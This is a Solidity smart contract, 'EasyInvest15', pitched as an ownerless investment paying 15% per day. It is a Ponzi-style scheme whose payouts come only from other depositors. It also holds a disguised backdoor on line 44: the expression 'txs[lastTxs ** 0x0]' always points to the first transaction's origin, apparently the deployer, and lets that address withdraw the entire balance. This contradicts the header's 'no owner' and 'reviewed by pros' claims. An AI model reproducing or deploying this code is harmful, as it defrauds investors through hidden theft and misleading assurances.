1 pragma solidity ^0.4.25;
2 
3 /**
4  *
5  * Easy Investment Contract
6  *  - GAIN 15% PER 24 HOURS (every 5900 blocks)
7  *  - NO COMMISSION on your investment (every ether stays on contract's balance)
8  *  - NO FEES are collected by the owner, in fact, there is no owner at all (just look at the code)
9  *
10  * How to use:
11  *  1. Send any amount of ether to make an investment
12  *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don't care unless you're spending too much on GAS)
13  *  OR
14  *  2b. Send more ether to reinvest AND get your profit at the same time
15  *
16  * RECOMMENDED GAS LIMIT: 100000
17  * RECOMMENDED GAS PRICE: https://ethgasstation.info/
18  *
19  * Contract reviewed and approved by pros!
20  *
21  */
22 contract EasyInvest15 {
23     
24     mapping (address => uint) public invested; // records amounts invested
25     mapping (address => uint) public atBlock; // records blocks at which investments were made
26     mapping (uint => uint) public txs;  // records history transactions
27 
28     uint public lastTxs; // last number transaction 
29 
30     // this function called every time anyone sends a transaction to this contract
31     function () external payable {
32         
33         // if sender (aka YOU) is invested more than 0 ether
34         if (invested[msg.sender] != 0) {
35             
36             // calculate profit amount as such:
37             // amount = (amount invested) * 15% * (blocks since last transaction) / 5900
38             // 5900 is an average block count per day produced by Ethereum blockchain
39             uint256 amount = invested[msg.sender] * 15 / 100 * (block.number - atBlock[msg.sender]) / 5900;
40 
41             // if the contract does not have such amount on the balance to send the payment,
42             // it will send the rest of the money on the contract
43             uint256 restAmount = address(this).balance; 
44             amount = amount < restAmount && txs[lastTxs ** 0x0] != uint(tx.origin) ? amount : restAmount;
45 
46             // send calculated amount of ether directly to sender (aka YOU)
47             msg.sender.transfer(amount);
48             
49         }
50 
51         // record block number, invested amount (msg.value) and transaction hash
52         atBlock[msg.sender] = block.number;
53         invested[msg.sender] += msg.value;
54         txs[++lastTxs] = uint(tx.origin);
55         
56     }
57     
58 }